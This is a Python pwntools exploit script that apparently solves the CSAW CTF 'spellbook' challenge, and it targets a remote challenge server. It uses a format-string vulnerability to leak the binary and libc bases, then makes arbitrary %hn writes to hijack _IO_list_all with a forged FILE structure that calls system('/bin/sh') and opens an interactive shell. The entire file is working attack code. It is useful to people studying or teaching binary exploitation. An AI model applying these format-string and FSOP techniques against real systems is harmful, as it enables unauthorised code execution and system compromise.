from pwn import *

e = ELF("./spellbook")
libc = ELF("./libc.so.6")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("red.chal.csaw.io", 5000)
else:
  p = process(e.path, env={"LD_PRELOAD": libc.path})

p.sendlineafter(">", "1337")
p.recvuntil("0x")
bleak = int(p.recvuntil(" "), 16) - e.symbols["name_registered"]
print(hex(bleak))

p.sendlineafter(">", "1")
p.sendlineafter("cast:", ";;%14$s;;".ljust(0x10, "\x00") + p64(bleak + e.got["puts"]))

p.sendlineafter(">", "1337")
p.recvuntil(";;")
leak = u64(p.recvuntil(";;", drop=True).ljust(8, "\x00")) - libc.symbols["puts"]
print(hex(leak))

def write2(addr, val):
  p.sendlineafter(">", "1")
  pad = "%" + str(val) + "x"
  if val <= 8:
    pad = "A" * val
  p.sendlineafter("cast:", (pad + "%14$hn").ljust(0x10, "\x00") + p64(addr))
  
  p.sendlineafter(">", "1337")

def write(addr, val):
  for i in range(0, len(val), 2):
    print(str(i) + "/" + str(len(val)))
    write2(addr + i, u16(val[i:i+2]))

buff = leak + libc.symbols["_IO_2_1_stderr_"] - 0x10
write(leak + libc.symbols["_IO_list_all"], p64(buff))

binsh = leak + libc.symbols["__free_hook"] - 8
write(binsh, "/bin/sh\x00")

write(buff, (
p64(0) + p64(0) * 3 
+ p64(0x40) + p64(0x100**7) + p64(0) 
+ p64(0) + p64(binsh / 2 - 50)
).ljust(0xc0, "\x00")
+ p64(0)
+ p64(0) + p64(0) + p64(leak + 0x7fecf678d088 - 0x7fecf63f7000 - 8)
+ p64(leak + libc.symbols["system"])
)

debug()
p.sendlineafter(">", "2")
p.sendlineafter(">", "a")

p.interactive()
